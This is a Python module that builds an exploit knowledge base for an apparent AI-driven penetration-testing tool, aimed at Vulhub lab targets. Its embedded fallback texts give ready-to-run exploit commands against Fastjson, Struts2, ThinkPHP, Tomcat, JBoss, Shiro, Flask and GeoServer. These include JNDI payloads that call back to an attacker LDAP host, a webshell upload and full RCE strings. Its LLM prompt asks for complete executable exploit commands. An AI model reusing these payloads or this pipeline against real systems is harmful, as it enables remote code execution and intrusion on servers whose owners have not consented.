"""
knowledge/builder.py
知识库离线构建器

使用方式（在项目根目录）：
    python -m backend.knowledge.builder
    python build_kb.py

流程：
  1. 遍历预定义的漏洞数据源（Vulhub README + 博客 URL）
  2. 抓取每个 URL 的内容
  3. 把原始内容发给 LLM，提取结构化利用知识
  4. 保存为 JSON 文件到 kb_data/ 目录

运行时 ExploitKB 只从 kb_data/ 加载 JSON，不做任何网络请求。
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import httpx

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

KB_DATA_DIR = Path(__file__).parent / "kb_data"

LLM_API_KEY = os.getenv("LLM_API_KEY", "")
LLM_BASE_URL = os.getenv("LLM_BASE_URL", "https://api.deepseek.com")
LLM_MODEL = os.getenv("LLM_MODEL", "deepseek-v4-flash")



@dataclass
class VulnSource:
    """一个漏洞的知识数据源"""
    vuln_id: str
    name: str
    urls: list[str] = field(default_factory=list)
    extra_context: str = ""
    fallback_content: str = ""



def _gh_urls(path: str) -> list[str]:
    """为一个 Vulhub 路径生成多个备用URL"""
    return [
        f"https://raw.githubusercontent.com/vulhub/vulhub/master/{path}/README.md",
        f"https://raw.githubusercontent.com/vulhub/vulhub/master/{path}/README.zh-cn.md",
        f"https://github.com/vulhub/vulhub/blob/master/{path}/README.md",
    ]


VULN_SOURCES: list[VulnSource] = [
    VulnSource(
        vuln_id="fastjson_1224",
        name="Fastjson 1.2.24 反序列化 RCE",
        urls=_gh_urls("fastjson/1.2.24-rce"),
        fallback_content="""
Fastjson 1.2.24 反序列化远程代码执行漏洞。

环境: docker compose启动后访问 http://your-ip:8090 可以看到JSON格式输出 {"age":20,"name":"Bob"}。
可以通过POST方式更新信息:
curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"hello", "age":20}'

漏洞原理: Fastjson在解析JSON时支持autoType，通过@type指定类名实例化任意类。
利用链: com.sun.rowset.JdbcRowSetImpl → JNDI注入（需要目标回连攻击机）。
目标环境: Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase 限制。
CVE: CVE-2017-18349

检测方法:
1. 访问根路径 / ，POST JSON数据，如果返回正常JSON（如 {"age":20}）说明后端解析JSON
2. POST发送 {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"} 如果返回包含fastjson报错信息（如 type not match），确认使用Fastjson
3. POST发送 {"@type":"java.net.Inet4Address","val":"127.0.0.1"} 也可触发Fastjson特征

关键检测命令:
curl -s -X POST http://your-ip:8090/ -H "Content-Type: application/json" -d '{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}'
成功标志: 响应中包含 "com.alibaba.fastjson" 或 "type not match" 或 "autoType"

利用方式（需要LHOST，使用toolbox内预装的JNDIExploit工具）:
/opt/jndi_fastjson.sh http://your-ip:8090/ $LHOST id
这个脚本会自动: 启动LDAP/HTTP监听 → 发送多种payload变体 → 等待回调 → 输出结果。
LHOST环境变量已自动注入到toolbox容器中。

【重要】payload格式说明:
- 很多Fastjson靶场用 JSON.parseObject(json, User.class)，@type放顶层会报 "type not match"
- 正确做法: 将@type嵌套在属性字段（如name）里: {"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://...","autoCommit":true},"age":20}
- 含空格的命令必须Base64编码，走 /Basic/Command/Base64/ 路径

手动利用:
1. 启动JNDIExploit: java -jar /opt/jndi/JNDIExploit*.jar -i $LHOST -l 1389 -p 8888 &
2. 命令Base64编码: CMD_B64=$(echo -n "id" | base64 -w 0)
3. 发送嵌套payload: curl -X POST http://target:8090/ -H "Content-Type: application/json" -d '{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://$LHOST:1389/Basic/Command/Base64/'$CMD_B64'","autoCommit":true},"age":20}'
4. 检查JNDIExploit日志看是否有 "Received LDAP Query" 和 "Response Code: 200"

利用方式2（BCEL，不需要回连，NAT环境优先用这个）:
python3 /opt/bcel_fastjson.py http://your-ip:8090/ id
注意: BCEL链需要目标classpath有tomcat-dbcp或commons-dbcp，并非所有靶场都有。

默认端口: 8090
""",
    ),
    VulnSource(
        vuln_id="fastjson_1247",
        name="Fastjson 1.2.47 反序列化 RCE",
        urls=_gh_urls("fastjson/1.2.47-rce"),
        fallback_content="""
Fastjson 1.2.47 反序列化远程代码执行漏洞（绕过autoType限制）。

环境: Fastjson 1.2.45 作为默认JSON解析器的Spring Web项目。
访问 http://your-ip:8090 返回JSON对象。POST JSON会被Fastjson解析。
目标环境: openjdk:8u102。CVE: 无官方CVE编号。

检测方法: 同1.2.24，POST发送@type payload看响应中是否有fastjson报错。

利用方式1（JNDI，需要LHOST，使用toolbox预装工具）:
/opt/jndi_fastjson.sh http://your-ip:8090/ $LHOST id
脚本会自动发送嵌套payload和1.2.47绕过payload。

【重要】1.2.47 绕过原理:
先用 java.lang.Class 将目标类写入Fastjson内部缓存，绕过autoType检查。
嵌套payload格式: {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LHOST:1389/...","autoCommit":true},"age":20}

手动利用:
1. CMD_B64=$(echo -n "id" | base64 -w 0)
2. curl -X POST http://target:8090/ -H "Content-Type: application/json" -d '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LHOST:1389/Basic/Command/Base64/'$CMD_B64'","autoCommit":true},"age":20}'

利用方式2（BCEL，不需要回连，NAT环境优先用这个）:
python3 /opt/bcel_fastjson.py http://your-ip:8090/ id

默认端口: 8090
""",
    ),
    VulnSource(
        vuln_id="struts2_s2045",
        name="Struts2 S2-045 (CVE-2017-5638)",
        urls=_gh_urls("struts2/s2-045"),
        fallback_content="""
Apache Struts2 S2-045 远程代码执行漏洞 (CVE-2017-5638)。

环境: Struts2 showcase应用。访问 http://your-ip:8080/showcase.action 可以看到页面。
默认端口: 8080。

漏洞原理: Jakarta Multipart解析器对Content-Type做OGNL求值。
利用方式: 在Content-Type头中注入OGNL表达式。

验证命令:
curl -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','S2-045-OK')}.multipart/form-data" http://your-ip:8080/showcase.action -I
如果响应头中出现 X-Test: S2-045-OK 说明漏洞存在。

RCE命令:
curl -H "Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data" "http://your-ip:8080/showcase.action"
""",
    ),
    VulnSource(
        vuln_id="struts2_s2057",
        name="Struts2 S2-057 (CVE-2018-11776)",
        urls=_gh_urls("struts2/s2-057"),
        fallback_content="""
Apache Struts2 S2-057 远程代码执行漏洞 (CVE-2018-11776)。

环境: Struts2 showcase应用，设置 alwaysSelectFullNamespace=true。
默认端口: 8080。

漏洞原理: 当 alwaysSelectFullNamespace=true时，URL中的namespace部分会被当作OGNL表达式求值。

检测方法:
curl -I "http://your-ip:8080/struts2-showcase/%24%7B233*233%7D/actionChain1.action"
如果返回的302重定向Location中包含 54289 (=233*233)，说明漏洞存在。

RCE需要构造更复杂的OGNL表达式进行沙箱绕过。
""",
    ),
    VulnSource(
        vuln_id="thinkphp_5023",
        name="ThinkPHP 5.0.23 RCE",
        urls=_gh_urls("thinkphp/5.0.23-rce"),
        fallback_content="""
ThinkPHP 5.0.23 远程代码执行漏洞。

环境: 默认端口80/8080。访问 / 看到ThinkPHP欢迎页面。

利用方式（直接RCE回显）:
curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' "http://your-ip:8080/index.php?s=captcha"

响应体中直接返回命令执行结果（如 uid=33(www-data)）。
""",
    ),
    VulnSource(
        vuln_id="weblogic_cve2023_21839",
        name="WebLogic CVE-2023-21839",
        urls=_gh_urls("weblogic/CVE-2023-21839"),
        fallback_content="""
Oracle WebLogic Server CVE-2023-21839 JNDI注入RCE。

环境: WebLogic 12.2.1.4.0，默认端口7001。
访问 http://your-ip:7001/console 可以看到WebLogic Console登录页面。

漏洞原理: T3/IIOP协议的ForeignOpaqueReference类在查找时存在JNDI注入。
需要目标回连攻击机。

检测方法: 端口7001开放 + WebLogic Console页面存在。
常见弱口令: weblogic:welcome1, weblogic:weblogic123。
""",
    ),
    VulnSource(
        vuln_id="tomcat_cve2017_12615",
        name="Tomcat CVE-2017-12615 PUT上传",
        urls=_gh_urls("tomcat/CVE-2017-12615"),
        fallback_content="""
Apache Tomcat CVE-2017-12615 远程代码执行（PUT方法上传JSP）。

环境: Tomcat 8.5.19，默认端口8080。web.xml中设置readonly=false允许PUT上传。

检测方法:
curl -v -X PUT "http://your-ip:8080/test.txt" -d "test content"
如果返回201 Created，说明PUT方法可用。

利用方式:
1. 上传JSP webshell（路径后加/绕过）:
curl -X PUT "http://your-ip:8080/shell.jsp/" -d '<%out.println(new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next());%>'

2. 访问webshell:
curl "http://your-ip:8080/shell.jsp"
""",
    ),
    VulnSource(
        vuln_id="php_fpm_cve2019_11043",
        name="PHP-FPM CVE-2019-11043",
        urls=_gh_urls("php/CVE-2019-11043"),
        fallback_content="""
PHP-FPM + Nginx 配置错误导致RCE (CVE-2019-11043)。

环境: Nginx + PHP-FPM，默认端口8080。
Nginx配置中 fastcgi_split_path_info 存在换行符注入漏洞。

检测方法: 访问 http://your-ip:8080/index.php 返回PHP页面。

利用方式: 使用专用工具 phuip-fpizdam:
go install github.com/neex/phuip-fpizdam@latest
phuip-fpizdam http://your-ip:8080/index.php

成功后:
curl "http://your-ip:8080/index.php?a=id"
""",
    ),
    VulnSource(
        vuln_id="activemq_cve2022_41678",
        name="ActiveMQ CVE-2022-41678",
        urls=_gh_urls("activemq/CVE-2022-41678"),
        fallback_content="""
Apache ActiveMQ CVE-2022-41678 远程代码执行。

环境: ActiveMQ 5.17.3。端口8161(Web控制台)和61616(OpenWire)。
默认密码: admin:admin。

检测方法:
curl -u admin:admin http://your-ip:8161/admin/
如果返回200且页面包含ActiveMQ说明弱口令存在。

利用方式1（通过API/Jolokia）:
curl -u admin:admin -d "body=test" http://your-ip:8161/api/message/TEST?type=queue

利用方式2（CVE-2023-46604，OpenWire协议RCE，需要回连）:
使用MSF模块 exploit/multi/misc/apache_activemq_rce_cve_2023_46604
""",
    ),
    VulnSource(
        vuln_id="jboss_cve2017_7504",
        name="JBoss CVE-2017-7504",
        urls=_gh_urls("jboss/CVE-2017-7504"),
        fallback_content="""
JBoss AS 4.x 反序列化远程代码执行 (CVE-2017-7504)。

环境: JBoss AS 4.0.5.GA，默认端口8080。

检测方法:
curl -v http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet
如果返回200说明反序列化接口存在。

利用方式:
使用ysoserial生成CommonsCollections1 payload发送到该接口:
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
curl -X POST http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object'
""",
    ),
    VulnSource(
        vuln_id="tomcat8_weak_password",
        name="Tomcat8 弱口令",
        urls=_gh_urls("tomcat/tomcat8"),
        fallback_content="""
Tomcat8 弱口令导致WAR部署RCE。

环境: Tomcat 8，默认端口8080。Manager应用启用，密码tomcat:tomcat。

检测方法:
curl -u tomcat:tomcat http://your-ip:8080/manager/text/list
如果返回200且列出应用列表，说明弱口令存在。

利用方式:
1. 创建恶意WAR: jar -cvf shell.war shell.jsp
2. 部署: curl -u tomcat:tomcat --upload-file shell.war "http://your-ip:8080/manager/text/deploy?path=/shell"
3. 访问: curl http://your-ip:8080/shell/shell.jsp
""",
    ),
    VulnSource(
        vuln_id="shiro_cve2016_4437",
        name="Shiro CVE-2016-4437",
        urls=_gh_urls("shiro/CVE-2016-4437"),
        fallback_content="""
Apache Shiro 1.2.4 RememberMe反序列化RCE (CVE-2016-4437)。

环境: 默认端口8080。访问登录页面。

检测方法:
curl -s -D - -o /dev/null http://your-ip:8080/ -H "Cookie: rememberMe=invalid"
如果响应头包含 rememberMe=deleteMe 说明使用了Shiro。

利用方式（使用toolbox预装的一键脚本，推荐）:
python3 /opt/shiro_exploit.py http://your-ip:8080/ "touch /tmp/shiro_pwned"
该脚本自动完成: ysoserial生成payload → 遍历15个默认密钥AES加密 → 发送rememberMe Cookie → 判断结果。
所有JDK 21兼容性问题（--add-opens）已在脚本内处理，不需要手动加参数。
不要手动调用ysoserial或自己写加密代码，直接用这个脚本。

验证RCE（盲执行）:
1. python3 /opt/shiro_exploit.py http://target:8080/ "touch /tmp/shiro_test"
2. 到靶机检查 /tmp/shiro_test 是否存在

默认端口: 8080
""",
    ),
    VulnSource(
        vuln_id="django_cve2022_34265",
        name="Django CVE-2022-34265",
        urls=_gh_urls("django/CVE-2022-34265"),
        fallback_content="""
Django CVE-2022-34265 SQL注入。

环境: Django 4.0.5，默认端口8000。

漏洞在Trunc/Extract函数的kind参数，需要应用使用了这些函数且kind参数可控。
检测需要根据具体应用接口测试。
""",
    ),
    VulnSource(
        vuln_id="flask_ssti",
        name="Flask Jinja2 SSTI",
        urls=_gh_urls("flask/ssti"),
        fallback_content="""
Flask (Jinja2) 服务端模板注入 SSTI。

环境: 默认端口8000。Python/Gunicorn/Werkzeug服务器。
访问 http://your-ip:8000/?name=test 可以看到输入被渲染到页面。

检测方法（必须用 --data-urlencode 避免花括号被shell解释）:
curl -s -G --data-urlencode 'name={{7*7}}' http://your-ip:8000/
如果响应中包含 "Hello 49" 或 "49" 说明存在SSTI。

RCE利用（重要：Jinja2沙箱中没有__import__，必须用lipsum或cycler链）:
curl -s -G --data-urlencode "name={{lipsum.__globals__['os'].popen('id').read()}}" http://your-ip:8000/
响应中直接返回命令执行结果（如 uid=0(root)）。

【严禁使用 __import__ 语法】Jinja2模板中没有__import__函数，用了会返回500错误。
正确的RCE payload（按优先级）:
1. {{lipsum.__globals__['os'].popen('COMMAND').read()}}
2. {{cycler.__init__.__globals__.os.popen('COMMAND').read()}}
3. {{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}

curl 注意事项:
- 必须用 -G --data-urlencode 发送参数，不能直接在URL里写 {{}}
- 错误示例: curl 'http://target/?name={{7*7}}'  ← 花括号被shell解释
- 正确示例: curl -s -G --data-urlencode 'name={{7*7}}' http://target/

默认端口: 8000
""",
    ),
    VulnSource(
        vuln_id="geoserver_cve2024_36401",
        name="GeoServer CVE-2024-36401",
        urls=_gh_urls("geoserver/CVE-2024-36401"),
        fallback_content="""
GeoServer CVE-2024-36401 属性名注入RCE。

环境: GeoServer，默认端口8080。
访问 http://your-ip:8080/geoserver/web/ 可以看到管理界面。

检测方法:
1. 先获取图层名:
curl "http://your-ip:8080/geoserver/wfs?service=WFS&request=GetCapabilities"

2. RCE验证:
curl "http://your-ip:8080/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=LAYER_NAME&valueReference=exec(java.lang.Runtime.getRuntime(),'id')"

响应XML中包含命令执行结果。
""",
    ),

    VulnSource(
        vuln_id="vulnhub_tomato",
        name="Vulnhub Tomato",
        urls=["https://www.vulnhub.com/entry/tomato-1,557/"],
        extra_context="Vulnhub CTF靶场。LFI via /antibot_image/antibots/info.php?image=参数, 日志投毒, 内核提权。",
    ),
    VulnSource(
        vuln_id="vulnhub_earth",
        name="Vulnhub Earth",
        urls=["https://www.vulnhub.com/entry/the-planets-earth,755/"],
        extra_context="Vulnhub CTF靶场。DNS枚举terra.local, XOR解密, admin命令执行面板, SUID提权。",
    ),
    VulnSource(
        vuln_id="vulnhub_jangow",
        name="Vulnhub Jangow 01",
        urls=["https://www.vulnhub.com/entry/jangow-101,754/"],
        extra_context="Vulnhub CTF靶场。busque.php?buscar=参数存在命令注入, WordPress, MySQL, 内核提权CVE-2021-4034。",
    ),
    VulnSource(
        vuln_id="vulnhub_phineas",
        name="Vulnhub Phineas",
        urls=["https://www.vulnhub.com/entry/phineas-1,674/"],
        extra_context="Vulnhub CTF靶场。Fuel CMS 1.4 RCE, SQLi, 配置文件泄露, SUID提权。",
    ),
    VulnSource(
        vuln_id="vulnhub_odin",
        name="Vulnhub Odin",
        urls=["https://www.vulnhub.com/entry/odin-1,619/"],
        extra_context="Vulnhub CTF靶场。WordPress, 插件漏洞, 文件上传, wp-config.php泄露, sudo提权。",
    ),
]



async def fetch_url(client: httpx.AsyncClient, url: str) -> str:
    """抓取单个 URL，返回文本内容"""
    try:
        resp = await client.get(url, follow_redirects=True, timeout=30)
        if resp.status_code == 200:
            text = resp.text.strip()
            logger.info(f"  ✅ {url} ({len(text)} chars)")
            return text
        else:
            logger.warning(f"  ❌ {url} -> HTTP {resp.status_code}")
            return ""
    except Exception as e:
        logger.warning(f"  ❌ {url} -> {e}")
        return ""


async def fetch_all_sources(source: VulnSource) -> str:
    """抓取一个漏洞的所有数据源，合并为一个文本。URL失败时使用fallback_content。"""
    parts = []

    if source.urls:
        async with httpx.AsyncClient(
            headers={"User-Agent": "Mozilla/5.0 PentestAI-KBBuilder/1.0"},
            verify=False,
        ) as client:
            for url in source.urls:
                text = await fetch_url(client, url)
                if text:
                    parts.append(f"--- 来源: {url} ---\n{text}")

    if source.extra_context:
        parts.append(f"--- 人工补充信息 ---\n{source.extra_context}")

    combined = "\n\n".join(parts)

    if not combined.strip() and source.fallback_content:
        logger.info(f"  📦 所有URL失败，使用内嵌兜底内容")
        combined = f"--- 内嵌知识 ---\n{source.fallback_content}"
    elif not combined.strip():
        logger.warning(f"[{source.vuln_id}] 无任何内容来源")
        return ""

    if source.fallback_content and parts:
        combined += f"\n\n--- 补充信息（来自内嵌知识）---\n{source.fallback_content}"

    return combined



EXTRACT_PROMPT = """你是一名资深渗透测试工程师，需要从以下漏洞资料中提取结构化的利用知识。

漏洞名称: {vuln_name}

原始资料:
{raw_content}

请从资料中提取以下信息，返回**严格的JSON格式**（不含markdown代码块）：

{{
  "vuln_id": "{vuln_id}",
  "description": "漏洞的一句话描述",
  "category": "漏洞分类（如: java_deserialization, ssti, file_upload, command_injection, weak_credential, sql_injection, expression_injection, config_exploit, lfi等）",
  "cves": ["CVE-xxxx-xxxxx"],
  "match_keywords": ["能匹配到这个漏洞的关键词列表，包括软件名、版本号、漏洞编号别名等"],
  "fingerprint_keywords": ["指纹识别中可能出现的关键词，如whatweb/httpx输出中的标志"],
  "affected_versions": "受影响的版本范围",
  "default_port": 8080,
  "common_endpoints": ["漏洞触发的URL路径列表"],
  "detection_method": "如何检测漏洞是否存在（具体的请求和预期响应）",
  "exploit_steps": [
    {{
      "step": 1,
      "description": "步骤描述",
      "command": "完整可执行的curl/wget/python命令（目标地址用 {{TARGET}} 占位）",
      "expected_result": "预期看到什么结果",
      "notes": "注意事项"
    }}
  ],
  "verification_command": "验证RCE的最简命令（用 {{TARGET}} 占位）",
  "verification_success_sign": "验证成功的标志（响应中应包含什么）",
  "requires_callback": false,
  "callback_note": "如果需要目标回连攻击机，说明原因和替代方案",
  "remediation": "修复建议",
  "tags": ["标签列表"]
}}

【关键要求】:
1. command字段必须是完整可直接执行的命令，用 {{TARGET}} 代替目标地址（如 http://{{TARGET}}:8080/）
2. 如果资料中有现成的curl命令或PoC，直接提取并标准化
3. 如果漏洞需要多步利用（如先上传再访问），每步都要有完整命令
4. detection_method 要具体到"发什么请求、看什么响应"
5. 对于需要目标回连的漏洞（JNDI/反弹shell），requires_callback设为true，并在callback_note中说明替代方案
6. 从资料中提取尽可能多的有效payload变体"""


async def extract_knowledge(
    source: VulnSource, raw_content: str
) -> Optional[dict]:
    """调用 LLM 从原始内容中提取结构化知识"""
    if not raw_content.strip():
        logger.warning(f"[{source.vuln_id}] 无内容可提取")
        return None

    if not LLM_API_KEY:
        logger.error("LLM_API_KEY 未设置！请设置环境变量后重试。")
        return None

    if len(raw_content) > 12000:
        raw_content = raw_content[:12000] + "\n\n... [内容过长已截断] ..."

    prompt = EXTRACT_PROMPT.format(
        vuln_name=source.name,
        vuln_id=source.vuln_id,
        raw_content=raw_content,
    )

    try:
        from openai import AsyncOpenAI

        client = AsyncOpenAI(
            api_key=LLM_API_KEY,
            base_url=LLM_BASE_URL,
        )

        response = await client.chat.completions.create(
            model=LLM_MODEL,
            messages=[
                {
                    "role": "system",
                    "content": (
                        "你是一名渗透测试知识库构建助手。"
                        "从漏洞资料中提取结构化利用知识，输出纯JSON。"
                    ),
                },
                {"role": "user", "content": prompt},
            ],
            temperature=0.1,
            max_tokens=4096,
            response_format={"type": "json_object"},
        )

        content = response.choices[0].message.content or ""
        data = json.loads(content)
        logger.info(f"  ✅ LLM提取成功: {len(data.get('exploit_steps', []))} 个利用步骤")
        return data

    except json.JSONDecodeError as e:
        logger.error(f"  ❌ LLM返回非法JSON: {e}")
        logger.debug(f"  原始返回: {content[:500]}")
        return None
    except Exception as e:
        logger.error(f"  ❌ LLM调用失败: {e}")
        return None



def save_entry(vuln_id: str, data: dict) -> Path:
    """保存一个知识条目到 JSON 文件"""
    KB_DATA_DIR.mkdir(parents=True, exist_ok=True)
    filepath = KB_DATA_DIR / f"{vuln_id}.json"
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return filepath



async def build_one(source: VulnSource) -> bool:
    """构建单个漏洞的知识条目"""
    logger.info(f"\n{'='*60}")
    logger.info(f"构建: {source.vuln_id} ({source.name})")
    logger.info(f"{'='*60}")

    logger.info("📥 抓取数据源...")
    raw_content = await fetch_all_sources(source)
    if not raw_content:
        logger.error(f"❌ {source.vuln_id}: 无数据源内容")
        return False

    logger.info("🤖 LLM 提取结构化知识...")
    data = await extract_knowledge(source, raw_content)
    if not data:
        logger.error(f"❌ {source.vuln_id}: LLM提取失败")
        return False

    try:
        from backend.knowledge.exploit_kb import build_search_text, get_embedding_sync
        search_text = build_search_text(data)
        data["search_text"] = search_text
        if search_text:
            logger.info("🔢 生成向量索引...")
            embedding = get_embedding_sync(search_text)
            if embedding:
                data["embedding"] = embedding
                logger.info(f"  ✅ 向量维度: {len(embedding)}")
            else:
                logger.info("  ⚠️ Embedding API 不可用，跳过向量索引")
    except Exception as e:
        logger.warning(f"  ⚠️ 向量索引生成失败: {e}")

    filepath = save_entry(source.vuln_id, data)
    logger.info(f"💾 已保存: {filepath}")
    return True


async def build_all(
    sources: Optional[list[VulnSource]] = None,
    concurrency: int = 3,
) -> dict[str, bool]:
    """
    构建所有知识条目。

    Args:
        sources:     要构建的数据源列表（默认全部）
        concurrency: 并发数（控制 LLM API 调用速率）

    Returns:
        {vuln_id: success} 字典
    """
    sources = sources or VULN_SOURCES
    results: dict[str, bool] = {}

    logger.info(f"🚀 开始构建知识库: {len(sources)} 个漏洞")
    logger.info(f"   LLM: {LLM_MODEL} @ {LLM_BASE_URL}")
    logger.info(f"   输出: {KB_DATA_DIR}")
    logger.info("")

    for source in sources:
        ok = await build_one(source)
        results[source.vuln_id] = ok
        if ok:
            await asyncio.sleep(1)

    success = sum(1 for v in results.values() if v)
    failed = sum(1 for v in results.values() if not v)
    logger.info(f"\n{'='*60}")
    logger.info(f"✅ 构建完成: {success} 成功, {failed} 失败")
    logger.info(f"📁 知识库目录: {KB_DATA_DIR}")

    if failed > 0:
        failed_ids = [k for k, v in results.items() if not v]
        logger.info(f"❌ 失败条目: {failed_ids}")

    return results


async def build_single(vuln_id: str) -> bool:
    """构建单个指定的漏洞知识"""
    source = next((s for s in VULN_SOURCES if s.vuln_id == vuln_id), None)
    if not source:
        logger.error(f"未找到数据源: {vuln_id}")
        logger.info(f"可用的 vuln_id: {[s.vuln_id for s in VULN_SOURCES]}")
        return False
    return await build_one(source)



def add_source(
    vuln_id: str,
    name: str,
    urls: list[str],
    extra_context: str = "",
) -> None:
    """
    添加自定义漏洞数据源（在调用 build 之前使用）。

    用于扩展知识库覆盖范围：
        from backend.knowledge.builder import add_source, build_single
        add_source("my_vuln", "My Vuln", ["https://..."], "额外说明...")
        asyncio.run(build_single("my_vuln"))
    """
    VULN_SOURCES.append(VulnSource(
        vuln_id=vuln_id,
        name=name,
        urls=urls,
        extra_context=extra_context,
    ))
    logger.info(f"[Builder] 已添加数据源: {vuln_id}")



def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="PentestAI 漏洞知识库离线构建器",
    )
    parser.add_argument(
        "--vuln", "-v",
        type=str,
        default=None,
        help="只构建指定的 vuln_id（不指定则构建全部）",
    )
    parser.add_argument(
        "--list", "-l",
        action="store_true",
        help="列出所有可构建的漏洞数据源",
    )
    parser.add_argument(
        "--add-url",
        nargs=3,
        metavar=("VULN_ID", "NAME", "URL"),
        help="临时添加一个数据源并构建",
    )
    args = parser.parse_args()

    if args.list:
        print(f"\n可构建的漏洞数据源 ({len(VULN_SOURCES)} 个):\n")
        for s in VULN_SOURCES:
            built = "✅" if (KB_DATA_DIR / f"{s.vuln_id}.json").exists() else "  "
            print(f"  {built} {s.vuln_id:30s} {s.name}")
        print(f"\n已构建: {sum(1 for s in VULN_SOURCES if (KB_DATA_DIR / f'{s.vuln_id}.json').exists())}/{len(VULN_SOURCES)}")
        return

    if not LLM_API_KEY:
        print("❌ 错误: 请设置 LLM_API_KEY 环境变量")
        print("   export LLM_API_KEY=sk-xxx")
        sys.exit(1)

    if args.add_url:
        vuln_id, name, url = args.add_url
        add_source(vuln_id, name, [url])
        asyncio.run(build_single(vuln_id))
    elif args.vuln:
        asyncio.run(build_single(args.vuln))
    else:
        asyncio.run(build_all())


if __name__ == "__main__":
    main()